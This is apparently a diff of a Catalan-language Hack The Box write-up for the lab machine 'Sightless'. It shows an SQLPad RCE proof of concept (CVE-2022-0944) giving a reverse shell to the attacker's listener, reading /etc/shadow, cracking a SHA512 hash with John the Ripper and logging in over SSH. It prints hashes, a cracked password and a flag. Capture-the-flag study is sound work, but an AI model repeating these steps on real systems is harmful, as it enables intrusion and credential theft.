@@ -1,3 +1,4 @@
+¡Nuevo! Combinaciones de teclas … Las combinaciones de teclas de Drive se han actualizado para que puedas navegar escribiendo las primeras letras
 Anirem directe al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:
 ```
 ┌──(polkali㉿kaliPol)-[~]
@@ -144,4 +145,187 @@ ETag: W/"1d9-E+82Qgtj4TJN18ynAdqcoit4wXQ"
 
 ![[Pasted image 20240922221355.png]]
 
-Per tant, ara que tenim la versió de l'SQLPad busquem si hi ha algun POC o exploit per aquesta versió en concret.
+Per tant, ara que tenim la versió de l'SQLPad que és la 6.10.0 busquem si hi ha algun POC o exploit per aquesta versió en concret. Hem trobat aquest repositori a GitHub el qual sembla que funcionarà i és un POC per aquesta versió del programa: 
+https://github.com/Robocopsita/CVE-2022-0944_RCE_POC 
+
+Tal i com s'explica al repositori l'execució de l'exploit és hiper senzilla. Simplement hem d'indicar a quina url hi ha l'sqlpad i a quina IP i port escoltarem nosaltres, la màquina atacant: 
+
+``./script.py http://admin.sightless.htb 10.10.11.2 443``
+
+Un cop fet això ja tenim la connexió amb la màquina víctima:
+
+```
+┌──(polkali㉿kaliPol)-[~/Documents/Sightless/CVE-2022-0944_RCE_POC-main]
+└─$ ./script.py http://sqlpad.sightless.htb 10.10.14.199 443     
+listening on [any] 443 ...
+connect to [10.10.14.199] from (UNKNOWN) [10.10.11.32] 38258
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@c184118df0a6:/var/lib/sqlpad# whoami
+whoami
+root
+root@c184118df0a6:/var/lib/sqlpad# `
+```
+
+Sembla que estem amb l'usuari root, tocarà investigar perquè no quadra que sigui tant senzill. Després d'investigar una mica, hem anat a l'arrel i trobem un fitxer anomenat docker-entrypoint:
+
+```
+root@c184118df0a6:/# ls
+ls
+bin
+boot
+dev
+docker-entrypoint
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+Si li fem cat veiem el següent:
+
+```
+root@c184118df0a6:/# cat docker-entrypoint
+cat docker-entrypoint
+#!/bin/bash
+set -e
+# This iterates any sh file in the directory and executes them before our server starts
+# Note: we intentionally source the files, allowing scripts to set vars that override default behavior.
+if [ -d "/etc/docker-entrypoint.d" ]; then
+    find /etc/docker-entrypoint.d -name '*.sh' -print0 | 
+    while IFS= read -r -d '' line; do 
+        . "$line"
+    done
+fi
+exec node /usr/app/server.js $@`
+```
+
+Preguntant-li al ChatGPT si és part de l'inicialització d'un contenidor Docker, ens diu que sí, que sembla molt probable que ho sigui:
+
+1. **Nom del fitxer**: El nom `docker-entrypoint` és habitual en Docker per definir el punt d'entrada d'un contenidor, que és el procés inicial que s'executa quan es posa en marxa el contenidor.
+    
+2. **Ruta `/etc/docker-entrypoint.d`**: Aquesta ruta és un altre indici clar, ja que moltes imatges Docker personalitzades usen aquest directori per emmagatzemar scripts d'inicialització (_entrypoint scripts_). Aquest directori es pot utilitzar per executar scripts abans d'arrencar el servei principal del contenidor.
+    
+3. **Comportament del script**: Aquest script busca i executa (_source_) tots els fitxers `.sh` al directori `/etc/docker-entrypoint.d`. Això és un comportament comú en un script d'entrada Docker que permet que scripts addicionals modifiquin l'entorn abans d'iniciar el procés principal del contenidor.
+    
+
+En resum, el fet que existeixi un `docker-entrypoint` i la presència d'un directori `docker-entrypoint.d` són signes molt forts que estàs en un entorn Docker.
+
+Per tant, ara té lògica que estiguem amb l'usuari root ja que estem en un entorn Docker, per tant hem de veure si podem obtenir algunes credencials o escalar privilegis des d'aquí dins. 
+
+Després de donar vàries voltes pels diferents directoris i fitxers, se'm ocorre que puc mirar el fitxer /etc/passwd a veure què hi trobem:
+
+```
+root@c184118df0a6:/# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+root@c184118df0a6:/# root:x:0:0:root:/root:/bin/bash
+bash: root:x:0:0:root:/root:/bin/bash: No such file or directory`
+```
+
+Sembla que hi ha un usuari anomenat michael i un usuari anomenat node, ara mirarem si al fitxer /etc/shadow trobem alguna password:
+
+```
+root@c184118df0a6:/# cat /etc/shadow
+cat /etc/shadow
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+daemon:*:19051:0:99999:7:::
+bin:*:19051:0:99999:7:::
+sys:*:19051:0:99999:7:::
+sync:*:19051:0:99999:7:::
+games:*:19051:0:99999:7:::
+man:*:19051:0:99999:7:::
+lp:*:19051:0:99999:7:::
+mail:*:19051:0:99999:7:::
+news:*:19051:0:99999:7:::
+uucp:*:19051:0:99999:7:::
+proxy:*:19051:0:99999:7:::
+www-data:*:19051:0:99999:7:::
+backup:*:19051:0:99999:7:::
+list:*:19051:0:99999:7:::
+irc:*:19051:0:99999:7:::
+gnats:*:19051:0:99999:7:::
+nobody:*:19051:0:99999:7:::
+_apt:*:19051:0:99999:7:::
+node:!:19053:0:99999:7:::
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::`
+```
+
+Sembla que acabem de trobar el que podria ser un hash de la contrasenya de l'usuari michael. També el de l'usuari root. Per tant, primer hem de mirar quin tipus de hash són, per fer això, anirem a la següent web: https://hashes.com/en/decrypt/hash . Pel que se'ns diu és un hash SHA512, per tant intentarem crackejarlo amb John the Ripper, per això, genero el fitxer user_hash i hi copio el hash a dins:
+
+``$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/``
+
+I ara amb John intentem crackejarlo:
+
+```
+┌──(root㉿kaliPol)-[/home/polkali/Documents/Sightless]
+└─# john user_hash -w=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+insaneclownposse (?)     
+1g 0:00:00:10 DONE (2024-09-23 22:39) 0.09157g/s 5380p/s 5380c/s 5380C/s kruimel..cuteface
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. `
+```
+
+
+Ara, hem obtingut la password de l'usuari michael:`` insaneclownposse`` . Ara, amb aquesta password provarem d'accedir a algun dels serveis que hi ha oberts: ssh i ftp.
+
+El primer que hem provat ha estat el servei ssh i hem pogut accedir-hi amb l'usuari michael i la seva password, obtenin així la User Flag:
+
+```
+┌──(polkali㉿kaliPol)-[~]
+└─$ ssh michael@10.10.11.32                                      
+The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
+ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
+michael@10.10.11.32's password: 
+Last login: Tue Sep 24 09:58:48 2024 from 10.10.14.54
+michael@sightless:~$ whoami
+michael
+michael@sightless:~$ pwd
+/home/michael
+michael@sightless:~$ ls
+user.txt
+michael@sightless:~$ cat user.txt 
+988301a6ffd5a0df33b4dfb853575730
+michael@sightless:~$ 
+```
